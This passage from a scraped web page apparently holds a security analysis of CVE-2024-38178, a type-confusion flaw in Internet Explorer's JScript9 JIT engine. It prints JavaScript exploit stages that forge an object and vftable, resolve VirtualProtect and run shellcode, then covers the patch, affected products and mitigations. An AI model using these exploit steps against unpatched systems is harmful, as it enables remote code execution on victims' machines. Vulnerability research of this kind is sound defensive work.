type","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":14,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_72":{"__typename":"Paragraph","id":"c4f3422a977b_72","name":"8c1f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fake_obj + 0x10 = compound string length","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_73":{"__typename":"Paragraph","id":"c4f3422a977b_73","name":"561b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fake_obj + 0x18 = compound string buffer pointer","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_74":{"__typename":"Paragraph","id":"c4f3422a977b_74","name":"0196","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fake_obj + 0x20 = shellcode string object address","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_75":{"__typename":"Paragraph","id":"c4f3422a977b_75","name":"b848","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u002F\u002F make fake object\nfake_obj = {\n    addr_low : read4(shellcode_str_obj.addr_low + 0x20, shellcode_str_obj.addr_high),\n\u002F\u002F make fake object\nfake_obj = {\n    addr_low : read4(shellcode_str_obj.addr_low + 0x20, shellcode_str_obj.addr_high),\n    addr_high : read4(shellcode_str_obj.addr_low + 0x24, shellcode_str_obj.addr_high)\n};\n\n\n\u002F\u002F write fake vftable\nwrite8(fake_obj.addr_low, fake_obj.addr_high, \n      fake_vftable.addr_low,fake_vftable.addr_high);\n\n\n\u002F\u002F write literal string type\nliteral_str_type = {\n    addr_low : read4(literal_str_obj.addr_low + 0x8, literal_str_obj.addr_high),\n    addr_high : read4(literal_str_obj.addr_low + 0xC, literal_str_obj.addr_high)\n};\nwrite8(fake_obj.addr_low + 0x8, fake_obj.addr_high, \n      literal_str_type.addr_low, literal_str_type.addr_high );\n\n\n\u002F\u002F write compound string length\ncompound_str_length = {\n    addr_low : read4(compound_str_obj.addr_low + 0x10, compound_str_obj.addr_high),\n    addr_high : read4(compound_str_obj.addr_low + 0x14, compound_str_obj.addr_high)\n};\nwrite8(fake_obj.addr_low + 0x10, fake_obj.addr_high, \n      compound_str_length.addr_low, compound_str_length.addr_high);\n \n  \u002F\u002F write compound string buffer pointer\ncompound_str_buffer = {\n    addr_low : read4(compound_str_obj.addr_low + 0x20, compound_str_obj.addr_high),\n    addr_high : read4(compound_str_obj.addr_low + 0x24, compound_str_obj.addr_high)\n};\nwrite8(fake_obj.addr_low + 0x18, fake_obj.addr_high, \n      compound_str_buffer.addr_low, compound_str_buffer.addr_high);\n\n\n\u002F\u002F overwrite b[53][1] with fake object\nwrite8(b[52][32] + 0x20, b[52][33], fake_obj.addr_low, fake_obj.addr_high);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"javascript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_76":{"__typename":"Paragraph","id":"c4f3422a977b_76","name":"35f3","type":"P","href":null,"layout":null,"metadata":null,"text":"b[53][1], where the literal string is located, will point to the fake object as shown in the figure so that when the method is called, the literal string in b[53][1] will reference the fake vftable.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":8,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":157,"end":165,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jqNmxHJZFvQmXkrpFNaUkw.png":{"__typename":"ImageMetadata","id":"1*jqNmxHJZFvQmXkrpFNaUkw.png","originalHeight":1248,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_77":{"__typename":"Paragraph","id":"c4f3422a977b_77","name":"ea0e","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jqNmxHJZFvQmXkrpFNaUkw.png"},"text":"Figure 8. The result of configuring method b[53][1] to reference a fake object.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_78":{"__typename":"Paragraph","id":"c4f3422a977b_78","name":"beac","type":"P","href":null,"layout":null,"metadata":null,"text":"3.4 Stage 4 — Reference the Fake Object and Execute Shellcode","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":61,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_79":{"__typename":"Paragraph","id":"c4f3422a977b_79","name":"e0c7","type":"P","href":null,"layout":null,"metadata":null,"text":"Obtain the KERNEL32.dll image base and VirtualProtect function address based on the image base of the leaked JScript9.dll. b[53][1] When calling the trim method of the literal string, refer to the vftable pointer of the fake object, calling the function located at offset vftable + 0x2c8. Since the vftable pointer is pointing to the addressb[56][0],we can call the desired function by modifying b[56][0] + 0x2c8.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":123,"end":131,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":272,"end":287,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":341,"end":349,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":396,"end":412,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_80":{"__typename":"Paragraph","id":"c4f3422a977b_80","name":"8a43","type":"PRE","href":null,"layout":null,"metadata":null,"text":"CreateFileW_low = read4(jscript9_base.addr_low + 0x3d1698, jscript9_base.addr_high);\nCreateFileW_high = read4(jscript9_base.addr_low + 0x3d1698+4, jscript9_base.addr_high);\n\n\nkernel32_base = {\n    addr_low: CreateFileW_low - 0x20460,\n    addr_high: CreateFileW_high\n};\n\n\nVirtualProtect = {\n    addr_low: kernel32_base.addr_low + 0x15470,\n    addr_high: kernel32_base.addr_high\n};\n\n\n\u002F\u002F...\n\n\n\u002F\u002F Write VirtualProtect\u002Fshellcode address to \n  Js::JavascriptString::GetOriginalStringReference offset (vftable + 0x2c8)\nwrite8(fake_vftable.addr_low + 0x2c8, fake_vftable.addr_high, \n      VirtualProtect.addr_low, VirtualProtect.addr_high);\nb[53][1]['trim']();","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"javascript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_81":{"__typename":"Paragraph","id":"c4f3422a977b_81","name":"9b6a","type":"P","href":null,"layout":null,"metadata":null,"text":"In the debugging results just before the call to the VirtualProtect function, we can see that the first argument, the rcx register, grants execution rights to the shellcode address. Then, at the same offset, we modify it with the shellcode address we want to execute instead of VirtualProtect and call the trim method once more, and the shellcode is executed.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":118,"end":121,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*zCDxZaJVsNndp3qCZD4XTw.png":{"__typename":"ImageMetadata","id":"1*zCDxZaJVsNndp3qCZD4XTw.png","originalHeight":439,"originalWidth":1380,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_82":{"__typename":"Paragraph","id":"c4f3422a977b_82","name":"47a7","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*zCDxZaJVsNndp3qCZD4XTw.png"},"text":"Figure 9. Calling the VirtualProtect function to grant execute privileges to a shellcode address","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*oC4Esk7zrs-JHV5-HyLq-Q.png":{"__typename":"ImageMetadata","id":"1*oC4Esk7zrs-JHV5-HyLq-Q.png","originalHeight":797,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_83":{"__typename":"Paragraph","id":"c4f3422a977b_83","name":"83d7","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*oC4Esk7zrs-JHV5-HyLq-Q.png"},"text":"Figure 10. Shellcode execution results in the Calculator.exe process running","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_84":{"__typename":"Paragraph","id":"c4f3422a977b_84","name":"892b","type":"H4","href":null,"layout":null,"metadata":null,"text":"4. Patched Code","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_85":{"__typename":"Paragraph","id":"c4f3422a977b_85","name":"36d8","type":"P","href":null,"layout":null,"metadata":null,"text":"In the August 2024 update, MS added code to compare the types of two operands using directly ValueType::operator even if the ValueType::IsUninitialized the function returns False and also added code to call IR::Opnd::SetValueType to perform a typecasting if the types do not match as a result of the operation to prevent type confusion.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":93,"end":112,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":125,"end":151,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":207,"end":229,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_86":{"__typename":"Paragraph","id":"c4f3422a977b_86","name":"dc83","type":"PRE","href":null,"layout":null,"metadata":null,"text":"void __fastcall GlobOpt::OptArraySrc(struct BasicBlock **this, IR::Opnd **a2)\n{\n\u002F\u002F...\n  if ( v5 && !GlobOpt::IsLoopPrePass(this) )\n  {\n+   v10 = (v43 + 16);\n+   \u002F\u002F if feature is enabled, always return true\n+   if(wil::details::FeatureImpl\u003C__WilFeatureTraits_Feature_1489045819\u003E::__private_IsEnabled(..))\n+   {\n+     if ( ValueType::IsUninitialized(v10) )\n+       goto LABEL_22;\n+     v35[0] = *(v8 + 10);\n+     v13 = *(v8 + 16);\n+     if ( !ValueType::IsUninitialized(v35) )\n+     {\n+       v35[0] = v12;\n+       if ( !ValueType::operator!=(v35, v13) )\n+         goto LABEL_22;\n+       LOWORD(v13) = v13 | 1;\n+     }\n+     IR::Opnd::SetValueType(v8, v13);\n+     v8 = v43;\n+   }\n             \n    else if ( !ValueType::IsUninitialized(v10) )\n    {\n      v35[0] = *(v8 + 10);\n      if ( ValueType::IsUninitialized(v35) )\n      {\n        IR::Opnd::SetValueType(v8, *(v8 + 16));\n        v8 = v43;\n      }\n    }\n  }\n  goto LABEL_15;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_87":{"__typename":"Paragraph","id":"c4f3422a977b_87","name":"fd54","type":"H3","href":null,"layout":null,"metadata":null,"text":"Impact","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_88":{"__typename":"Paragraph","id":"c4f3422a977b_88","name":"56ba","type":"P","href":null,"layout":null,"metadata":null,"text":"This vulnerability is in JScript9.dll, a legacy JavaScript engine in Internet Explorer that has been deprecated. Basically, any software that uses it is potentially vulnerable. We further investigated a partial list of software that loads this engine and found it below.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_89":{"__typename":"Paragraph","id":"c4f3422a977b_89","name":"b630","type":"P","href":null,"layout":null,"metadata":null,"text":"Affected Product","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_90":{"__typename":"Paragraph","id":"c4f3422a977b_90","name":"6b73","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Microsoft Edge (Internet Explorer Mode)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_91":{"__typename":"Paragraph","id":"c4f3422a977b_91","name":"47ae","type":"ULI","href":null,"layout":null,"metadata":null,"text":"GOMPlayer 2.3.100.5370(Toast Popup 1.0.0.8) — gom&company","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_92":{"__typename":"Paragraph","id":"c4f3422a977b_92","name":"9b2d","type":"ULI","href":null,"layout":null,"metadata":null,"text":"KMPlayer 4.2.3.14 — Pandora TV","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_93":{"__typename":"Paragraph","id":"c4f3422a977b_93","name":"fa63","type":"ULI","href":null,"layout":null,"metadata":null,"text":"PotPlayer 1.7.22318 — Kakao Corp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_94":{"__typename":"Paragraph","id":"c4f3422a977b_94","name":"5196","type":"P","href":null,"layout":null,"metadata":null,"text":"* As of July 15, 2024, additional impact analysis for GOMPlayer version 2.3.100.5370 is available in See Appendix C. Affected Product — GOMPlayer","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":105,"end":145,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_95":{"__typename":"Paragraph","id":"c4f3422a977b_95","name":"4ff3","type":"P","href":null,"layout":null,"metadata":null,"text":"Software that uses the legacy WebView controller for web browsing, ad pop-up rendering, etc., including those listed above, is affected or potentially vulnerable to this vulnerability, and we recommend not using it until you install the August 2024 Windows Cumulative Update.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":139,"end":161,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_96":{"__typename":"Paragraph","id":"c4f3422a977b_96","name":"9388","type":"P","href":null,"layout":null,"metadata":null,"text":"* Maximum impact is remote code execution with a Medium Integrity Level if no separate sandbox exists.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_97":{"__typename":"Paragraph","id":"c4f3422a977b_97","name":"d7cb","type":"P","href":null,"layout":null,"metadata":null,"text":"In addition, attacks that exploit the JScript9.dll vulnerability, such as CVE-2020-1380 and CVE-2022-41128, have been discovered in recent years, so even if you have updated to the latest version, you may still be a target for future attacks.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_98":{"__typename":"Paragraph","id":"c4f3422a977b_98","name":"9d0f","type":"H3","href":null,"layout":null,"metadata":null,"text":"Mitigation","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_99":{"__typename":"Paragraph","id":"c4f3422a977b_99","name":"5e94","type":"P","href":null,"layout":null,"metadata":null,"text":"For Edge, users set the Allow sites to reload in Internet Explorer mode option to Disallow (default) in Settings-Default Browser-Internet Explorer Compatibility. For MS Office, set it to block the loading of remote HTML content (default).","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*iFVcjNK3EQa6FePhgZpGgA.png":{"__typename":"ImageMetadata","id":"1*iFVcjNK3EQa6FePhgZpGgA.png","originalHeight":728,"originalWidth":1298,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_100":{"__typename":"Paragraph","id":"c4f3422a977b_100","name":"4e0e","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*iFVcjNK3EQa6FePhgZpGgA.png"},"text":"Figure 11. Settings that disallow the use of IE Mode","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_101":{"__typename":"Paragraph","id":"c4f3422a977b_101","name":"27d0","type":"P","href":null,"layout":null,"metadata":null,"text":"Users should also be careful not to view Web pages or document files from unknown or suspicious sources. If you are using an application that loads JScript9.dll through a legacy WebView controller, users should install Windows August Cumulative Update because there is no separate mitigation for this vulnerability.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_102":{"__typename":"Paragraph","id":"c4f3422a977b_102","name":"db11","type":"P","href":null,"layout":null,"metadata":null,"text":"Software vendors are encouraged to change the web viewer in their products to Edge-based WebView to avoid using JScript9.dll, which continues to be targeted. In addition, we recommend utilizing software bills of materials (SBOM) to identify these third-party components and regularly monitoring vulnerabilities and product lifecycles to build a response plan for legacy modules.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_103":{"__typename":"Paragraph","id":"c4f3422a977b_103","name":"c06c","type":"H3","href":null,"layout":null,"metadata":null,"text":"Conclusion","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_104":{"__typename":"Paragraph","id":"c4f3422a977b_104","name":"aba3","type":"ULI","href":null,"layout":null,"metadata":null,"text":"CVE-2024-38178 is a remote code execution vulnerability in the JIT compiler of JScript9.dll, the legacy JavaScript Engine in Internet Explorer, caused by an incorrect assumption in type validation.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_105":{"__typename":"Paragraph","id":"c4f3422a977b_105","name":"4e0d","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The vulnerability affects all versions of Windows systems that have not applied cumulative updates since August 2024.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_106":{"__typename":"Paragraph","id":"c4f3422a977b_106","name":"6ffa","type":"ULI","href":null,"layout":null,"metadata":null,"text":"This vulnerability and several other 0-day attacks targeting JScript9.dll over the past few years, such as CVE-2020-1380 and CVE-2022-41128, indicate that threat groups continue to discover and exploit vulnerabilities against the legacy engine.\n- Given that the PoC and exploit process are very similar to CVE-2022-41128 and that exploit and analysis information is publicly available, the exploitation phase of this vulnerability was likely accomplished quickly after discovery.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":229,"end":230,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_107":{"__typename":"Paragraph","id":"c4f3422a977b_107","name":"0af8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"We recommend that users keep Windows Update to the latest version and disable Edge’s Internet Explorer mode.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_108":{"__typename":"Paragraph","id":"c4f3422a977b_108","name":"db3d","type":"ULI","href":null,"layout":null,"metadata":null,"text":"It’s challenging for endpoint users to determine which engine the WebView controller in their application is using, so software providers should aim to avoid using legacy engines.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_109":{"__typename":"Paragraph","id":"c4f3422a977b_109","name":"8531","type":"H3","href":null,"layout":null,"metadata":null,"text":"Reference","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_110":{"__typename":"Paragraph","id":"c4f3422a977b_110","name":"a30c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fgoogleprojectzero.github.io\u002F0days-in-the-wild\u002F0day-RCAs\u002F2022\u002FCVE-2022-41128.html","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":88,"href":"https:\u002F\u002Fgoogleprojectzero.github.io\u002F0days-in-the-wild\u002F0day-RCAs\u002F2022\u002FCVE-2022-41128.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_111":{"__typename":"Paragraph","id":"c4f3422a977b_111","name":"148b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fmsrc.microsoft.com\u002Fupdate-guide\u002Fvulnerability\u002FCVE-2022-41128","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":68,"href":"https:\u002F\u002Fmsrc.microsoft.com\u002Fupdate-guide\u002Fvulnerability\u002FCVE-2022-41128","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_112":{"__typename":"Paragraph","id":"c4f3422a977b_112","name":"188b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fwww.trendmicro.com\u002Fko_kr\u002Fresearch\u002F20\u002Fh\u002Fcve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":104,"href":"https:\u002F\u002Fwww.trendmicro.com\u002Fko_kr\u002Fresearch\u002F20\u002Fh\u002Fcve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_113":{"__typename":"Paragraph","id":"c4f3422a977b_113","name":"501d","type":"ULI","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fkisa-vuln.notion.site\u002FMS-f6906de00a124b9fadee90722bf854c2#09994a03b0a04853894f5d70b3afe85e","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":98,"href":"https:\u002F\u002Fkisa-vuln.notion.site\u002FMS-f6906de00a124b9fadee90722bf854c2#09994a03b0a04853894f5d70b3afe85e","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_114":{"__typename":"Paragraph","id":"c4f3422a977b_114","name":"92bc","type":"H3","href":null,"layout":null,"metadata":null,"text":"Appendix A. JScript9.dll Overview","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_115":{"__typename":"Paragraph","id":"c4f3422a977b_115","name":"7dbc","type":"P","href":null,"layout":null,"metadata":null,"text":"JScript9.dll is a JavaScript Engine in Internet Explorer built into Windows by default and was used in Internet Explorer 9 through 11. With the subsequent announcement of the Edge Browser, the JScript9 Engine was replaced by the Chakra Engine*, which is why the JScript9 Engine is also referred to as the legacy Chakra Engine.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_116":{"__typename":"Paragraph","id":"c4f3422a977b_116","name":"10b6","type":"P","href":null,"layout":null,"metadata":null,"text":"* The Edge Chakra Engine was later replaced when Edge became Chromium-based.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_117":{"__typename":"Paragraph","id":"c4f3422a977b_117","name":"6ab9","type":"P","href":null,"layout":null,"metadata":null,"text":"On June 15, 2022, Microsoft ended support for Internet Explorer, but JScript9.dll is still used to support legacy applications such as Internet Explorer mode in Microsoft Edge and applications via the WebView control, which is why it continues to be distributed in current Windows builds.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*HWL1_uzkzHu4Esq_xONM4g.png":{"__typename":"ImageMetadata","id":"1*HWL1_uzkzHu4Esq_xONM4g.png","originalHeight":432,"originalWidth":752,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_118":{"__typename":"Paragraph","id":"c4f3422a977b_118","name":"9887","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*HWL1_uzkzHu4Esq_xONM4g.png"},"text":"Figure 12. Internet Explorer modes supported by Edge","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Pxv6Nn1w7i4_8wXs6vmKkg.png":{"__typename":"ImageMetadata","id":"1*Pxv6Nn1w7i4_8wXs6vmKkg.png","originalHeight":227,"originalWidth":738,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_119":{"__typename":"Paragraph","id":"c4f3422a977b_119","name":"1b11","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Pxv6Nn1w7i4_8wXs6vmKkg.png"},"text":"Figure 13. jscript9.dll loaded by the iexplorer.exe process when Internet Explorer mode is enabled.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_120":{"__typename":"Paragraph","id":"c4f3422a977b_120","name":"4daa","type":"P","href":null,"layout":null,"metadata":null,"text":"JavaScript engines like JScript9.dll, V8, JavaScriptCore, and Chakra use just-in-time (JIT) compilers to optimize for faster execution.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*aNZS31WpfNOxh19DhqxJLQ.png":{"__typename":"ImageMetadata","id":"1*aNZS31WpfNOxh19DhqxJLQ.png","originalHeight":796,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_121":{"__typename":"Paragraph","id":"c4f3422a977b_121","name":"c2d9","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*aNZS31WpfNOxh19DhqxJLQ.png"},"text":"Figure 14. JScript9.dll’s JIT Engine Behavior","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_122":{"__typename":"Paragraph","id":"c4f3422a977b_122","name":"98e7","type":"P","href":null,"layout":null,"metadata":null,"text":"The JScript9 Parser converts JavaScript code into an Abstract Syntax Tree, traverses it, and generates ByteCode to be executed by the Interpreter. Suppose there are code snippets that are repeatedly called while executing the generated ByteCode. In that case, the JIT Compiler is executed in a new thread based on the collected Profile Data such as type information. The JIT Compiler generates optimized machine code and performs optimization by replacing the entry point of the next executed ByteCode with machine code, which is the basic behavior flow of JavaScript Engine with JIT.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_123":{"__typename":"Paragraph","id":"c4f3422a977b_123","name":"2bed","type":"P","href":null,"layout":null,"metadata":null,"text":"The advantage of this optimization is that it can improve the execution speed of JavaScript by making assumptions based on profile data when executing specific repeated code snippets and removing or relocating unnecessary code based on that. It also prevents safety issues by returning to the interpreter and executing ByteCode again if certain conditions violate the assumptions when the machine code is executed. (Bailout)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_124":{"__typename":"Paragraph","id":"c4f3422a977b_124","name":"5f72","type":"P","href":null,"layout":null,"metadata":null,"text":"However, there is also a problem with the JIT compiler behavior in that it fails to bail out properly if a certain state violates an assumption, or if the assumption itself is incorrect, the generated machine code may have a safety issue. Exploiting these vulnerabilities, there have been several 0-day attacks targeting the JIT compiler in JScript9.dll over the past few 